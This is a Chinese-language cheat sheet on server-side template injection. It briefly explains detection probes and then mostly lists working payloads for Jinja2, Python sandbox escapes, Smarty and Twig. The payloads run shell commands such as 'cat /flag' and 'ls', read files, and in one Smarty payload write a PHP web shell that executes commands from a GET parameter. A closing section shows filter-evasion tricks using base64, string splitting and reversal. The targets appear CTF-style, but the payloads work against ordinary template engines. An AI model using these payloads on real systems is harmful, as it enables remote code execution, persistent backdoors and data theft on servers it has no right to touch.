SSTI是什么
SSTI类似与sql注入，但是与sql有所不同的是，SSTI利用的事故网站的模板引擎，主要是网站处理框架。

Python的jinja2 mako tornado django
php的smarty twig
java的jade velocity
一个模板例子：

$output = $twig->render( $_GET['custom_email'] , array("first_name" => $user.first_name) );

这串代码有一个很明显的XSS，但是它还有更深的危害。

custom_email={{7*7}} // GET 参数

49  // $output 结果

如何使用
检测漏洞
文本类
大部分的模板语言支持我们输入 HTML

smarty=Hello {user.name}
Hello user1

freemarker=Hello ${username}
Hello newuser

any=<b>Hello</b>
<b>Hello<b>

未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。除此之外，模板语言的语法和 HTML 语法相差甚大，因此我们可以用其独特的语法来探测漏洞。虽然各种模板的实现细节不大一样，不过它们的基本语法大致相同，我们可以发送如下 payload来确认漏洞。

smarty=Hello ${7*7}
Hello 49

freemarker=Hello ${7*7}
Hello 49
###代码类
在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名.这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：

personal_greeting=username<tag>
Hello
personal_greeting=username}}<tag>
Hello user01 <tag>
判断注入模板

## 漏洞利用

### jinjia2

{{config}}

标志：

&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(seconds=43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt

------------------------------------------------------------------------------------------------------

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}{% endif %}{% endfor %}

#### payload:

```
name={{[].__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /f*").read()')}}
```

### python2

[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')
"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
"".__class__.__mro__[-1].__subclasses__()[40](filename).read()
"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')

### python3

''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']
"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']


### smarty

一，漏洞确认(查看smarty的版本号)：
{$smarty.version}
二，常规利用方式：（使用{php}{/php}标签来执行被包裹其中的php指令，smarty3弃用）
{php}{/php}
执行php指令，php7无法使用

<script language="php">phpinfo();</script>
三，静态方法
public function getStreamVariable($variable){ $_result = ''; $fp = fopen($variable, 'r+'); if ($fp) { while (!feof($fp) && ($current_line = fgets($fp)) !== false) { $_result .= $current_line; } fclose($fp); return $_result; } $smarty = isset($this->smarty) ? $this->smarty : $this; if ($smarty->error_unassigned) { throw new SmartyException('Undefined stream variable "' . $variable . '"'); } else { return null; } }

payload1:（if标签执行PHP命令）
{if phpinfo()}{/if}
{if system('ls')}{/if}
{if system('cat /flag')}{/if}
四，其他payload
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

### twig

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}


### waf绕过

base64

().__class__.__bases__[0].__subclasses__()[40]('r','ZmxhZy50eHQ='.decode('base64')).read()
相当于:
().__class__.__bases__[0].__subclasses__()[40]('r','flag.txt')).read()
字符串拼接：
+号绕过

().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()
相当于
().__class__.__bases__[0].__subclasses__()[40]('r','flag.txt')).read()
[::-1]取反绕过

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}
reload方法：

del __builtins__.__dict__['__import__']    # __import__ is the function called by the import statement

del __builtins__.__dict__['eval']    # evaluating code could be dangerous
del __builtins__.__dict__['execfile']   # likewise for executing the contents of a file
del __builtins__.__dict__['input']   # Getting user input and evaluating it might be dangerous

当没有过滤reload函数时，我们可以重载builtins

reload(__builtins__)

### 当不能通过[].class.base.subclasses([60].init.func_globals[‘linecache’].dict.values()[12]直接加载 os 模块

这时候可以使用getattribute+ 字符串拼接 / base64 绕过 例如:

[].__class__.__base__.__subclasses__()[60].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__.values()[12]

等价于:

[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]